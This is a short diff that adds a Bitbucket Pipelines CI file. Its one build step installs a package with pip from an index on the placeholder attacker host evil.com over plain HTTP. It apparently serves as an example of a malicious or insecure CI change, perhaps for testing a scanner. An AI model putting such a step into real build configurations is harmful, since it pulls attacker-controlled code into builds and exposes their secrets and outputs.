@@ -1,0 +1,5 @@
+pipelines:
+  default:
+    - step:
+        script:
+          - pip install --index-url http://evil.com/simple/ pkg
